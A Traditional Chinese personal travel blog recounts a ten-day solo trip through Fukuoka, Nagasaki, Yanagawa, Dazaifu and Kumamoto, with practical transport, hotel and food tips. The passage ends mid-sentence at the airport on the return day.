14:30，隨手買一本日語書臨時抱佛腳。遇到其他飛機跑錯跑道，整個機場 Reset；飛機繞了一大圈才起飛，大概 Delay 了快 30 分鐘；坐到老飛機電視超小。華航攜手五桐號 打造空中最萌甜點 ，是 Dinotaeng 的超萌短尾袋鼠，桂花烏龍也蠻好喝的。因飛機延誤大約 21:00 才出機場。出機場後可以看到一個指示牌，告知要去的方向＆在哪個站牌等車；除了到博多也能到其他地方，可參考 此篇文章 或 官網 ；如果要去遠的地方記得查好班次。本來預計要搭的是 2 號直達博多站，但 2 號好像末班還是要再等一個小時(我忘了)，就改搭 1 號到福岡空港國內線(地下鐵福岡機場站)，再搭地鐵到博多再轉地下鐵七隈線到渡邊通站。Hello Fukuoka!第二張照片的左邊就是要入住的飯店。飯店小開箱，整體偏舊、燈光昏暗、隔音普普、冷氣稍微有聲音，但依然乾淨整潔；不過還是有點小後悔為什麼不多加一些錢住同樣在附近的 APA 連鎖飯店。原本預計第一晚就去屋台逛逛，因爲太累就改超商隨便吃一吃，早點休息準備明天的行程。Day 2 長崎一早從床外看福岡市區的景觀。博多車站搭地鐵到博多太繞，直接走路到渡邊通搭公車到博多比較快。到博多後先去人工櫃檯兌換 JR Pass (出示護照)並預約前往長崎的位子，兌換 JR Pass 的外國人很多，大概排了快一小時才排到，建議提早出門或提前去換。 JR 九州 Pass 目前還是只能人工櫃檯兌換，請提早去排隊兌換，如果博多站太多人可以 考慮去附近的其他車站兌換，會比較快！ 我是買五日券，從換的那天開始算五日，進出車站都用有本券(有日期＆金額那張)，劃位的指定券只是讓你知道座位在哪而已，不能用來進出車站；本券要收好，這五天都會用到，遺失就沒了！博多到長崎有兩段，會先到武雄溫泉再從武雄溫泉換車往長崎；在同一個月台換車，車次時間他們都有算好，基本上到站後直接往對面走上車就是。候車的時候發現九州的火車都好有特色！！位子很大很舒服，靠窗可以看風景。車程時間約：1 小時 50 分小插曲：完成一次國民外交 ✅ 搭乘時隔壁坐一組家庭，爸爸媽媽帶兩個小孩出去玩，小孩坐車到一半突然吐，看爸爸一時沒有衛生紙只能直接拿報紙擦，就順手拿衛生紙跟濕紙巾給他。 要下車的時候，爸爸給了我一個 三原市お土産 (蝦子米餅)。長崎車站出長崎車站後天氣大好！本來還擔心今天會下雨。出站後往長崎路面電車方向搭乘。長崎(南邊)第一站先往南到長崎新地中華街逛逛。對外國人可能是蠻特殊的景點，但對華人還好，裡面有賣長崎特色刮包、長皿烏龍、強棒麵、小籠包…不過當時沒什麼胃口，所以只路過逛逛就走了。一路往哥拉巴園走，還有經過孔廟ＸＤ經過荷蘭坡(就是個斜坡)，然後搭乘電扶梯往上到哥拉巴園 2 號入口，整個地形就是個面海的大山坡地。入園哥拉巴園走馬看花，建築風格、內部裝飾；很像淡水紅毛城(因為同樣都是荷蘭人建立的)最後別忘了去兌換免費的寫真照片，從這也能瞭望長崎港的郵輪。下山的途中就會經過大浦天主教教堂，沒進去，拍個照就離開了。買了長崎的刮包吃看看，我覺得還是台灣的好吃！回程往北到長崎原爆資料館的途中先到眼鏡橋下車拍照，從正面看水中的倒影真的蠻美的，有時間的話直得一拍。長崎(北邊)參觀原爆資料館更多的感受是沈浸與反思，場館設計了很多場景(爆炸當時的或讓人沈浸的)、裝置藝術、歷史資料、採訪；讓參觀者能沈浸在當時的歷史氛圍跟反思日後的戰爭的殘酷可怕。出資料館後往前走就是原子彈爆炸點，和平公園。路上(包括原爆資料館)都懸掛很多彩色紙鶴象徵祈求和平。稻佐山夜景離開和平公園後先去客美多稍做休息，準備晚上去看 世界三大夜景之一的稻佐山夜景。查公車出客美多走一小段有公車站到稻佐山下纜車搭乘處(淵神社駅)，就漫步到車站等車。結果被公車誤點雷了，這小站沒有電子看板，Google Map 又寫已離站但又沒看到車；等了 5 分多鐘想說該不會今天沒發車，就趕快再查附近別的站牌有到淵神社的，然後又再走 10 分鐘到另一個站牌搭另一班車才到。 好笑的是走到一半發現那班誤點的車來了。。。但也來不及了 Orz下車後對面就是淵神神社，直接往上走穿過幼兒園之後就是長崎纜車(淵神社駅)，因為沒有要待到太晚所以就直接買來回票(比較便宜，但如果要到太晚會沒纜車，只能搭公車回去)。有點烏來-&gt;雲仙樂園的 Fu。下纜車後，還有另一個遊山看景的纜車可以搭，但我沒嘗試，所以直接一路往觀景台方向走。忘了拍觀景台的照片，是一座 360 度的塔，可以環繞看整個長崎市區、港口、山的景色，而且無需門票；可以從西邊太陽從港口落下開始看，到東邊晚上的市區夜景。觀景台很大，不怕人多。日落後就能看到整個長崎市區、車站的夜景，很美。最後看一眼長崎車站的夜景、買個長崎蛋糕伴手禮(後來發現博多就有賣、保存期限約 12 天，應該後面再買就好…)，準備回博多了。再次遇到誤點，這次是 JR (信號故障)；大概延誤快一小時才到博多(已累攤)，司機開很快感覺很晃。買個宵夜回飯店休息。Day 2 柳川太宰府一日遊 + LalaPort 福岡早上先到 福岡（天神）遊客中心買一日套票 ( 福岡天神、藥院或線上購票都可 )，可以自己算一下有沒有比較便宜。 KKday 【九州票券】太宰府柳川暢遊套票（桃園機場取件）西鐵 — 一日暢遊「古都太宰府」與「水鄉柳川」兩大景點。另外會送兩本 Coupon， 太宰府那本有一張可以兌換免費的梅枝餅 。順序沒有一定，但遊船有時間限制，下午 2 點之後就沒了；所以就直接照流程走，福岡-&gt;柳川-&gt;太宰府-&gt;福岡。買完票後走人工窗口，給站員看票後就能進車站直接搭車(不用劃位)前往柳川。車程時間：約 1 小時 10 分柳川遊船出站後會看到穿著白色背心的工作人員(如果沒有旁邊有服務中心可以問) 會給你地圖+回程方式+時刻表 &amp; 直接引導你去搭接駁車到乘船場。出站同樣走人工剪票，站員會撕掉福岡往柳川站的票。本來看路程想說可以用走的，但出站就看到有工作人員直接用心引導，所幸就搭乘巴士了。到達乘船處等下一班船時剛好遇到前面是台灣人家族旅行，就地與他們抱團，一路閒聊(畢竟我獨旅又不會日文ＸＤ來九州幾乎沒跟人講話)。水非常乾淨，這個季節綠油油的比較沒那麼美，但相對人也少。船夫會一路介紹經過的景點、唱唱歌(台灣人多半會聽過，很多老歌)。過橋的時候船夫會請大家低頭防止撞到，蠻有趣的；路途上遮陰不多，有點曬。中間會經過一家冰店，賣水果冰的，可以買一個消消暑；船夫也會發給每個人冰袋降降溫(很貼心)。一路與前面抱團的台灣家族的爸爸閒聊，最後還獲得一張名片。下船後沒找到免費接駁車位子，還排錯隊排到其他的(非西鐵套票)接駁車被拒絕搭乘；要研究一下地圖上的乘車點 (川流船場（沖之端）)或直接詢問比較快。我後來是走去搭公車，回西鐵柳川站。太宰府柳川往太宰府要在二日市車站換乘往太宰府的列車(要到另一個月台)。車程時間：約 1 小時搭乘旅人號到太宰府，經 五條 (2.5 條悟QQ)；有點類似北投到新北投，就一班列車來回開。中間有一節車廂有展示太宰府的文物跟可以寫明信片，可以去看看。太宰府站也很美，外面的 Lawson 也很有日本的 Fu。出站右手邊就是全球唯一的五角(日文合格)碗一蘭拉麵。吃完拉麵後來個梅枝餅，跟梅子沒太大關係，比較像紅豆烤年糕，要吃現做的皮才會是蘇的，好吃！我忘了用西鐵套票送的退換券換，花 150 日圓自己買了一個；看保存期限只有一天，無法帶回台灣。表參道繼續往太宰府走就會經過日本最美之一的星巴克，空間蠻大但人也多，沒有駐足就離開了。通往神社的橋如果是晚上＋人少應該蠻好拍的，人太多隨手亂拍。參拜完後回到太宰府站，往回去福岡 Lalaport。福岡 Lalaport一樣從太宰府站先回到二日市再轉搭往博多方向的列車，在 大橋（福岡）下車，出站往左邊乘車處找到 Lalaport 直達車，跳上去一站就到 福岡 Lalaport 了。總車程時間約：50 分一來就看到外面巨大的福岡鋼彈。Lalaport 很大，很好逛也適合親子；樓上還有個大操場，有小朋友在玩也有人躺著休息。樓上有 Jump Shop 賣少年 Jump 週刊的相關周邊，有排球少年、航海王、獵人、咒術回戰、鏈鋸人…等等，買了些咒術的周邊。滿 5000 日圓一樣可以退稅，但好像是退到他的 App 還什麼的，有點複雜，而且吃的不含在內。去美食街吃宮崎牛丼飯，要走的時候買了些宵夜回去(咖哩麵包、如水庵大福)。晚上發光的鋼彈還是蠻震撼的。回程直達公車，不是在原本下車的地方搭車，照館內指示牌直接從館內的巴士站搭乘即可。回飯店休息，自配平板(電視太舊沒有智慧功能)；咖哩麵包酥脆好吃，裡面還有肉餡、大福還不錯，不過我比較喜歡 弁才天 的。Day 3 門司港、小倉城、博多運河城、中洲屋台一早同樣先到博多站，搭乘 JR 往門司港，再回來小倉城。博多小倉交通小插曲 沒特別看 Google Map 的規劃，搭到 JR Pass 不能搭的新幹線 希望號 20 ；出站時逼逼逼出不去，經站員引導補票 2,160 日圓才完成出站，不過快也是真的快，這班 15 分鐘就到門司港。門司港有驚無險(想說會不會被罰錢)的來到門司港。出站往前走就是門司港，平日來完全沒人；剛好遇到藍翼門司吊橋要放下。放下後可往後走到後面的觀景塔，鳥瞰整個門司港。塔出來剛好走一圈門司港。午餐就吃門司港有名的咖哩燒。小倉城門司到小倉很近，但小倉是小站，出站一片荒蕪，找小倉的入口還走錯繞了一大圈，其實入口就在小倉外面的 Mall 那側。小倉城小小的不大，裏面參觀的項目蠻多的，只是天守閣的景很普通(正面看出去就是那個 Mall)。參觀完後就回車站搭車回博多了，乖乖搭 JR，但是小站只有區間車花了一個多小時慢慢回去。博多運河城回博多時時間還早，就去博多運河城、市區晃晃。沒特別查，本來以為是什麼「城」或什麼「護城河」之類，結果是百貨公司ＸＤ，真的有「護城河」而且有水舞表演。這邊要逛也很多可以逛，也有 Jump Shop。時間還很早就亂走，走出去吃 博多祇園鐵鍋煎餃 。皮酥酥脆脆裡面有湯汁，很好吃；因為語言不通，店員阿姨還很可愛比手畫腳比大肚子 2 份（1 份只有 8 顆，2 份 16 顆才吃得飽）當時沒有意會過來，所以還是只點一份＋博多有名的名太子。中洲屋台吃完，天還沒黑先漫步道中洲屋台逛逛。時間還很早就先走去逛天神的百貨 (Parco) 等天黑再回來看夜景。樓上有 Animate、扭蛋首抽就中五條悟。夜景的中洲屋台給人一種煙火氣感。浮誇顯眼的日式廣告招牌。中洲屋台就是這一側的路邊食堂，人聲鼎沸；有拉麵、關東煮、燒烤，沒有特別吸引我，就沒進去吃了。回飯店喝酒吃宵夜休息。Day 4 住吉神社、櫛田神社、天神地下街、福岡塔、福岡軟銀鷹隊棒球比賽一日福岡步行，出飯店後先走到附近的住吉神社。住吉神社小小的，不是在附近應該不會特地去。再次經過博多運河城前往櫛田神社。路上看到屋台餐車早上停放的地方，好小巧可愛。櫛田神社櫛田神社比較大，也抽了支籤，看到求職「會突然成功」好像對工作又看到了希望呢。有展示博多祇園祭的神轎，很巨大壯觀。繼續漫步福岡，中午走到 ハカタミヤチク (日本一宮崎牛専門店 博多みやちく) 品嚐宮崎牛。這樣一份宮崎牛排＋啤酒大約台幣 $650 上下，好吃又便宜！宮崎牛 Juice 且沒什麼異味。天神地下街吃完午餐就去天神一代、天神地下街亂逛，順便買伴手禮小雞餅乾、蛋糕；也去超市買了串很紅的麝香無籽葡萄嚐嚐。在天神亂晃，發現野生的熊本熊部長。先回飯店放買的伴手禮＋休息片刻後出發前往福岡塔＋看棒球賽。福岡塔從市區搭公車前往福岡塔。 KKday 日本・九州｜福岡塔 Fukuoka Tower 入場券福岡塔全鏡面設計，從外面看很美，我覺得比晴空塔還美！(感謝路人姊姊幫拍照)但因為塔蓋在城市的最外側靠海的地方，上面景色普普；不確定晚上夜景如何。出福岡塔後慢慢走到上一站就是 福岡 PayPay 棒球場，是海的味道。福岡軟銀鷹隊棒球比賽人很多(大概坐滿 7 成)，但是現場買還有票。買票小插曲買票的時候遇到阿伯櫃檯，看到外國人語言不通緊張的手在抖；我也跟著緊張ＸＤ；一時腦霧，選了前面看台的最後一排最中間的指定席位子（左右坐滿人）結果進去超尷尬，進出都要一路 すみません，而且位子也很小，擠在日本人中間，我一句日文也不會，很尷尬。。。正經危坐的看完整場球賽。票價快 $1,500 台幣，想想應該買個最便宜的爛座位自己輕鬆看就好。不得不說巨蛋的視覺效果(離球場很近)、整個大型的螢幕動畫顯示都很好。福岡軟銀鷹隊的加油應援傳統，7 局上大家會灌氣球(用手動打氣桿) 然後釋放出去，至於垃圾…就不管了最後會有人清。最後主場 4:2 獲得勝利，比中職精彩，投手球速都在 145km 上下，局局有攻防，很少三上三下；但打的節奏又很快，看起來很舒服。不過啦啦隊的部分，台灣還是比日本豐富的。主場獲勝會在大巨蛋內放煙火，很酷！！買了條軟銀鷹的毛巾做為到此一遊的紀念，也一解 上次去阪神虎甲子園棒球場票售罄不得其門而入的窘境 。散場的人非常多，但大家不會站太近也都慢慢走，就跟著大家一路走到最近的地下鐵唐人街町站，因為公車感覺要排很久。回飯店休息順便嚐嚐下午買的麝香無籽葡萄嚐嚐，很甜、有點甜過頭。Day 5 熊本 (熊本城、鶴屋百貨)一早先 Chekout 走到飯店附近的藥院晃晃發現沒什麼，吃個麥當勞(滿福堡加蛋配冰美式這樣才 $107)就回來拿行李準備搭 JR 去熊本了。最後跟這間飯店說再見了，Lobby 有福岡軟銀鷹隊的娃娃、外面有掛 🇹🇼 國旗也蠻猛的，因為隔壁就是中國人開的友誼超商，很多中國人。福岡博多 -&gt; 熊本車站電子機器劃位，想說有點遠、帶著行李還是劃個位。按照說明書劃位，總之就是： 先選擇語言、先選擇語言、先選擇語言 （不然插入票卡後不能改，要退出重來） 插入 JR Pass 票卡 選擇出發、到達站 (用英文站名搜尋) 選擇班次、座位 完成有問題現場都有站務人員可以問，本來有一班 15 分鐘後發車的沒位子，只能買 45 分鐘後的另一班列車。不過也還好沒買那班，從博多站內走到新幹線往鹿耳島(經熊本)的月台，大概就要 10 分鐘，要繞一下有點遠，時間太趕。趕在 JR Pass 到期最後一天用完。 本來還擔心我的 27 寸行李箱 (約 69 x 50 x 29 cm) 會不會上面行李架放不下要買 特大行李附帶席，規定是三邊和超過 160 cm 一定要買 。 27 寸放腳會太卡，也會卡到隔壁；實測放行李架蠻穩的，但仍要扛上去放，買靠窗的位子在拿放行李時又怕會卡到走道的乘客；還好遇到好心的日本阿伯願意讓位子給我拿放行李。一到熊本就看到巨大的熊本熊，先轉 JR &amp; 地鐵到飯店寄放行李(市立體育館前站)。熊本到處都是熊本熊….2024–11–16 Update：⚠️⚠️熊本縣內公共運輸： 九州產交公車、產交公車、熊本公車、熊本都市公車及熊本電鐵 ，已不在接受使用 Suica、PASMO、ICOCA 等交通系卡支付車資 ，目前只能使用現金，未來可能會導入信用卡付費，敬請注意。⚠️⚠️⚠️⚠️⚠️⚠️⚠️熊本城放好飯店後搭路上電車前往熊本城(到通町筋站)。可以先去下面的 櫻之馬場 城彩苑(忘了拍照) 逛逛補充能量，可以在此購買熊本城門票，這邊沒什麼人，上去熊本城入口買遇到團體人會很多卡成一團。門票有：熊本城 800、熊本城+買票後面那棟(歷史文化體驗 湧湧座) 850、熊本城+買票後面那棟(歷史文化體驗 湧湧座) +熊本博物館 1,100 三種我是買 熊本城+湧湧座 想說多 50 日圓而已，但去逛了一圈覺得普普，多補充了熊本城內的展覽跟地震相關文物，適合拍照體驗。熊本城天守閣 2023 年已完成修復開放，其他建築仍在維修中(可以看到吊車)。新的是直接規劃成天空步道，照著路線一路走到熊本城。上天守閣之後可以看到一路走來的天空步道。鳥瞰熊本城前方廣場與後方持續維修中的古蹟。地震之後當時的狀況模型。在廣場隔壁的伴手禮店收藏了熊本城模型，完成我的三大名城搜集任務！原路返回到 買票的地方，去逛湧湧座；裡面有熊本城模型跟一個樂高做的熊本城，很酷。因天氣不理想，就沒再往後繞道博物館、加藤神社。一路再走回通町筋站，這邊就是上通商店街與熊本本地的鶴屋百貨，百貨東棟一樓就是前幾個月才整個重新裝修好的熊本熊廣場(熊本熊部長辦公室)。在商店街亂逛剛好遇到熊本熊 x 交通安全 的公開活動，獲得一個熊本熊手提袋。這整區不算好逛，蠻無聊的；只有蔦屋書店、無印良品那棟比較好逛，熊本剛下車站就可以感受到老年人很多、年輕人很少，本地的鶴屋百貨也幾乎都是老年人、賣婦人服、居家用品居多，較少年輕人的東西。去鶴屋百貨的熊本熊周邊店買了些熊本熊(樣式比熊本廣場多)，再去百貨地下街買酒、吃的東西(晚餐+宵夜)回飯店吃。香露是店家推薦的熊本地酒，甜口的，喝起很順，但我覺得米味不夠。Green Rich飯店 - 水前寺 (Green Rich Hotel Suizenji) 2023/09值得一提的是飯店，以往其實不會特別看評價；就看差不多 3 顆星以上的就好；這間的隔音也不好又遇到整層都是國小畢業旅行，連續兩天的早晚都一直開關門碰！碰！碰！，非常地大聲擾人。查了下 Google/Agoda 上的評價明細，覺得心有戚戚焉。隔音不好應該是老舊飯店的通病，這個我還能忍(自備耳塞)；但是飯店的 WiFi 如同前人留下的評價，純粹糊弄人而已。WiFi 整間都有訊號，但是在房間內就算訊號滿格速度還是非常慢，連網頁都打不開，要貼著房門用，網路速度才會是正常的，幾乎等於飯店沒網路。 價格也很不美麗，不如都住福岡，同樣價格在福岡直升 APA 了。 經過這次經驗之後知道就算是日本飯店也還是要看一下評價的….真的除了離機場交通方便外沒優點，附近也無超商(要走 10 分鐘以上才有)。Day 6 水前寺成趣園、熊本熊廣場表演、花畑廣場、櫻町購物中心早上起來出門直接走到對面的水前寺成趣園。 KKday 參考行程：九州熊本一日遊|阿蘇中岳火山・草千里・熊本城・水前寺成趣園/季節水果吃到飽|福岡博多出發(中英日對應)水前寺成趣園(出水神社)有點板橋林家花園感，裡面整理的很乾淨、水很清澈，有小富士山、出水神社跟很肥的錦鯉還有貓。熊本熊廣場表演走完後搭乘路面地鐵到水道町前往熊本熊廣場(昨天來過)。裡面有熊本熊部長周邊可以拍照，外面有 Monitor 能看到裡面的狀況。因為距離當天表演時間 11 點還很早，先去隔壁鶴屋百貨覓食。表演時刻表可參考熊本 廣場官方網站 (時間不一定，但週六多半有三場)。路過旁邊的鶴屋百貨一樓也發現一隻心酸打工彈鋼琴的部長。去 B1 吃了當地有名的蜂樂饅頭，就是餡料很厚實的車輪餅，有分白豆、紅豆兩種餡，喜歡甜食的會很愛，配上咖啡就是一頓早餐。快 11 點時回到熊本熊廣場等待表演，現在不用抽籤，只要在表演前入場都可以，超過時間應該只能在外面看 Monitor 了，有帶小孩的話可以坐裡面。表演前會先說明秩序規則，例如：不可以拍打熊本熊、拍照不可舉過頭(會擋到後面的)、根據日本法律如果有人臉要打馬賽克、歡迎大家上傳到 SNS。表演時間約 30 分鐘，主持小姊姊會邊幫熊本熊發言(全日文)，流程大概是跟大家打招呼、講熊本的趣事、跳舞(上面這首、很洗腦)、跟不同國家的人說 Hi。(這場台灣人最多ＸＤ)。熊本熊本尊很萌，動作很大、很有趣。廣場裡面賣的周邊反而少、價格也偏高，就沒有在這邊下手。看完表演接近中午，走下通商店街吃 勝烈亭 新市街本店 ；走到商店街外為了，瞬間從兒童級升級成限制級，整排都是無料案內所(另一邊熊本銀座通也是)。超厚 Jucie 豬排飯，比較特別的是有附他們的酸菜(共用、自己夾、記得用紅色筷子)，其他跟台灣吃日式豬排一樣，會上研磨棒、芝麻給你磨醬；飯、茶、湯、高麗菜一樣免費續；一口氣吃了兩碗白飯，很滿足。花畑廣場吃飽喝足後繼續走下通商店街往花畑廣場走。剛好遇到週六廣場有活動，Food Summit 2003，整圈賣吃的，中間架一個壘台在表演日摔。買了杯氣泡酒+烤腸坐下來看表演，烤腸不香沒有台灣的好吃。吃到一半還打到台下，有點嚇人，但帶入感很強；後來實在太熱了，吃完就走了，去後面的櫻町購物中心逛百貨公司。花畑廣場，感覺每週六日都有活動，來之前可以查一下，下一週是台灣祭！櫻町購物中心頂樓有一隻熊本熊在揮手，二樓也有販賣熊本熊周邊( 我覺得是最齊全的 )。這邊也會有熊本熊表演，要參考公告時間。可以一路從外面樓梯上到頂樓找到揮手的熊本熊本尊，這棟樓下同時也是熊本客運中心，可以在二樓買票前往其他城市。樓頂有一個很大的花園、可以玩水的水池，有帶小孩可以上去玩。從裡面也能搭電扶梯上去，從三樓的敘敘苑(這家敘敘苑完全沒人)就能找到再網上的電扶梯。 個人覺得櫻町購物中心比鶴屋百貨新、好逛。櫻町購物中心出來旁邊就是熊本縣物產館，除了有熊本縣的特產外也有一些熊本熊周邊(例如：熊本熊香爐ＸＤ)。回程又走了一遍上+下通商店街。去無印買了衣服跟雜物、松本清補充藥妝(不知為何我的 Visa 在松本清都刷不過，之前在東京就被雷過，這次在熊本一樣無法刷，只能犧牲日幣現金了)。到飯店時接近傍晚，晚餐就路上 Lawson 隨便解決，早早睡準備明天去阿蘇火山！Day 7 阿蘇火山、草千里、阿蘇神社、熊本站 AMU PLAZA KUMAMOTO KKday 參考行程：【一人成團,每日出團】日本熊本一日遊|熊本城&amp;阿蘇山火山口&amp;草千里(含健康Buffet吃到飽) |福岡出發一早出門走到公車站搭往阿蘇站的客運；等車又遇熊本熊。會先經過阿蘇機場(後天就要來了 Orz)。一路上比較特別的是進阿蘇火山範圍時，車上會介紹阿蘇火山然後播放當地的山歌要你一起想像漫步在阿蘇火山草原的感覺。抵達阿蘇站，站外有 航海王烏索普 銅像可以拍照(我忘了)。可以在這邊用販賣機買阿蘇火山一日券(大概便宜個幾百日圓)跟拿時刻表，一日券只限時刻表上的三站上下車，上車要抽整理券；其他站貌似無法使用。我要搭乘 8 號路線，10:45 分上山的公車。上山車程時間：約 40 分鐘。人不算多，時間快到稍微排一下隊就上車了，看大家都有上；不過應該是山路安全考量，沒有站立的位子；另外會暈車的可能要吃暈車藥。阿蘇另外有直升機體驗行程，直接坐直升機看火山，有興趣的人可以查查。阿蘇火山Kami-komezuka一路上山，會先經過草千里再到山上總站，從山上總站再換一次公車約 10 分鐘就會到山上火山口。剛好遇到隔壁的台積電大哥一樣是獨旅(來出差的XD)，也都是第一次來阿蘇，於是一起抱團跑行程。山上總站要再換一次公車，我們懶得在排公車，選擇直接用走的上山(大約 15–20 分鐘)。走路到山上廣場，出來就是阿蘇中岳第四火山口。有旅伴拍照就不是問題了！山上很涼爽、完全不熱，充滿硫磺味，有圖三的疾病要考慮身體狀況。純走馬看花，就沒有走到阿蘇中岳火山口，上來看看就走下山了。小插曲一路上聊得太開心走下來後，沒仔細看公車方向，要發車了趕快上車結果又被載上來，只好再走一遍ＸＤ到山上總站後，這次看清楚 8 號路線公車、8 號路線公車、8 號路線公車，往山下阿蘇車站的；在草千里下車。草千里吃有名的 おか牛丼飯，人多但位置也很多，出餐快幾乎不用等。吃完走出去逛逛草千里(有點擎天岡的味道)，有騎馬體驗活動。吃完搭同班 8 號公車往阿蘇站，原路下山。阿蘇神社到阿蘇站的時候，往阿蘇神社(宮地站)的 JR 再三分鐘就要發車了，錯過要再等一小時；用跑的進站，又遇到 阿蘇是小站沒有電子支付 ，要買車票，手忙腳亂的在販賣機買完車票上車。 阿蘇站只有一個月台，直接無腦上車即可；後來發現如果時間真的來不及買票，也可以直接上，出站再補就好。宮地站出來大概要再走 20 分鐘才會到阿蘇神社(直直走就到，但有點遠)。路上又遇野生熊本熊。神社不大，一下就參拜完；神社部分也在維修中。出來後旁邊有一條小小的表參道商店街，可以買些吃的稍作休息。 感謝大哥請吃炸牛肉馬鈴薯餅。都逛完之後開始慢慢走回程，本來想說搭乘 15:47 的 JR 回熊本，但走回宮地站才知道那班是全指定席的車，無販售自由席並且已全售完，無法上車。附上時刻表，或請先查好時刻；不然就會像我們一樣只能等一小時，等下一班 16:35 的區間 JR 回熊本。時間還很久，就一起走回路上的松本清逛逛。(其實也蠻遠的，大概要 10 分鐘)。最後看一眼寧靜的阿蘇。區間車慢慢開回熊本，大概花了 1 小時 45 分才到。路線有一段是之字形，會倒車開，別擔心，沒搭錯！熊本站 AMU PLAZA KUMAMOTO回到熊本站與大哥告別，期待有緣再見。在熊本站逛新開的 AMU PLAZA KUMAMOTO 百貨公司(比櫻町購物中心更大更豐富)還有旁邊的肥後市場(賣吃的)。一樣發現很多熊本熊ＸＤ。在美食街隨便吃了晚餐宮崎雞(普通)，整棟逛了一遍後買了些宵夜、熊本產的草莓酒(試喝完不錯，準備帶回台灣) 回飯店。有一家蠻特別的店叫「BIWAN 美灣」賣台灣的食品(有看到乖乖ＸＤ)，查了一下是 台灣阿原肥皂開的 。https://kumataiwanlife.com/查資料的時候還找得一個酷網站 — https://kumataiwanlife.com/ 裡面有中文的熊本最新消息、活動、冷知識(例如： 熊本的「OK繃」叫「LIBATAPE」 )…等等今天才發現飯店的販賣機居然有賣罐裝生可樂，我在三大超商都沒找到。 它是 Suntory 跟百事一起推出的，台灣買不到，用做生啤的做法作可樂，氣泡感很足，不太有糖漿的膩，我喝一般可樂喝到後面都因為太膩倒掉，但生可樂我能喝完！酒足飯飽後，早早睡去；準備迎接最後一天的熊本(扣掉回程飛機那天)。Day 9 熊本亂晃、採購熊本逛到第三天其實挺無聊的，能去的景點早就去完了，只能盡量找一些地方去看看然後買一些紀念品、藥妝。原本預計去島原市，但路途太遠(單趟 2 小時 45 分)，加上 JR Pass 早就過期，要再花錢買長途車票，放棄；大分、由布院同樣太遠，放棄；南阿蘇村，懶得去留給下次；所以就市區亂晃跟採購了，慢慢走。熊本稻禾神社一早一樣來到通町筋，先去第一天沒去到的熊本稻禾神社加藤神社一路往後面走去加藤神社(蠻遠的大概要走 20 分鐘，有山坡路。)看到這山坡往上拐進去就是加藤神社了，也可以看到第一天從天守閣看後面在維修的地方，還有很多散落的城牆要逐一恢復。小小的，有一半也還在維修中。有一個小的熊本地震募款箱，加藤神社就沒參拜了，改投募款箱。這邊可以從後方看到熊本城。原路返回後前往熊本市役所(14 樓有免費展望台)，到加藤神社的路走起來蠻遠的，可以搭公車。 本來打算去熊本美術館、手工藝館…等等，但週一都沒開！熊本市役所熊本市役所 14 樓可以鳥瞰整個熊本是、熊本城。市役所出來再往櫻町購物中心方向走，會經過一個天橋，是一個很好的拍景地點，可以拍熊本路面地鐵。這個十字路口就是熊本銀座通，前幾天有說到這邊也都是無料案內所。櫻町購物中心回櫻町購物中心逛街，再吃一次宮崎牛配熊本產的啤酒；離開時買了一隻熊本熊大福帶回台灣做紀念(可愛)。唐吉訶德一路再從下通走到上通回到通町筋，途中順便去唐吉軻德採購(這間的免稅櫃台在二樓結帳)。買完想說先回飯店休息＋放東西。小插曲 搭路面電車遇到可愛的熊本阿公阿嬤；指著免稅品的透明袋子裡的日清泡麵說「蘇勾以捏～」，我說「Good!Good@」；然後拿出剛買的熊本熊大福跟阿嬤說「卡哇伊捏～」，他比個讚說說「咖哇伊、阿哩嘎豆」；然後我說「私は台湾人です」阿嬤好像跟我打招呼什麼的(日語太爛聽不懂，只聽得出元氣什麼的)，我意思意思回應，下車的時候也跟阿公阿嬤打招呼說掰掰。回飯店後第一次掀開窗簾，後面就是水前寺流域；其實風景不錯，晚上聽得到蟲鳴。休息片刻後下午沒什麼地方去了，就隨便找地圖上的點去晃晃。魯夫銅像先走路到熊本縣本廳前，找魯夫銅像。健軍神社再搭公車+走路到健軍神社；小神社，去的時候快關門了幾乎沒人。這邊沒有公車直達，都要走一小段(約 15 分鐘)；離開神社後繼續往「熊本動物園」方向走(約 20–30 分鐘)，找喬巴銅像。喬巴銅像在路上看到軍曹井蓋(好像是之前的活動)。在動物園門口找到喬巴銅像。 熊本動物園之前查好像蠻無聊的，就沒特別安排要進去；傍晚來人家也休園了。小插曲 在動物園門口遇到一組台灣家庭要拍照，就幫他們拍了；隔天去機場又遇到又再幫他們拍一次與飛機的合影，弟弟說我是拍照哥哥ＸＤ。看地圖再往後走有水前寺流域的江津湖公園，順路走去看看；發現 只是當地人運動的河濱公園 ，就直接搭公車回去飯店了(還是公車起站)。葦善らーめん晚上去新水前寺站的居酒屋吃飯。with 前前前同事(數字科技，後來去博客來上過 Line 新聞封面、a.k.a 博客來女神的 Irene Yu 吃飯)。還能在異地跟熟悉的人吃飯太感動了，畢竟我也自閉了好幾天(不懂日文、幾乎不講話)，最後還獲得別府伴手禮😭。吃太快，只記得手羽先好吃，也嘗試了馬肉串燒(熊本馬肉刺身有名，我不敢吃)；老闆娘很親切，但菜單都是日文，字形用翻譯軟體難辨識，只能猜ＸＤ吃完飯我用走的回飯店(約 15 分鐘) 最後漫步在熊本街頭，去 Lawson、全家買了冰跟甘酒(本來以為是清酒，結果 甘酒不是酒，是滋養消暑聖品 )。也順手買明天早上的早餐(哈密瓜麵包＋果汁)，全家的這款果肉果汁(哈密瓜、草莓…)真的好喝，我幾乎有看到就會買來喝，裡面有果肉甜甜的很好喝。Day 10 回程在日本獨自流浪 10 天了，也開始想家了、想念台灣的美食、台灣的朋友們。這間飯店唯一優點，出來對面就有機場交通車。同樣遇到實際誤點，Google Map 顯示已通過的狀況；還好有長崎的教訓與電子看板，我繼續耐心的等候，大概遲到了快 10 分鐘，車終於來了。司機會幫忙把行李箱放到客運下方的行李區，下車要記得拿就好。在路上又遇到野生熊本熊圍籬ＸＤ熊本真的到處可見熊本熊！9 點多就早早到機場(因為也沒地方想去了，晚點來也是在飯店待到晚點出門)。阿蘇熊本機場(KMJ) 很新很小，班次也不多；國際線今天就三班而已，國際線只有三個櫃檯，所有輪流使用。大約等到 10:20 才開放報到/托運，之前都搭長榮(可手提兩件)，這次搭華航才發現是手提一件，現場趕快壓縮成一件。地勤說托運完先不要走，大概在現場等個 5 ~ 10 分鐘，如果行李有問題他們會叫號碼去處理(機場太小，也沒電子看板，只能乾等)。沒問題後，往國際線出發方向出境；本來想說早早來機場逛，結果機場也沒什麼。 那時候可能真的累了，後來才知道其實有觀景平台可以看飛機，掛完行李之後其實可以去逛逛，不急著出境。 要注意 3F 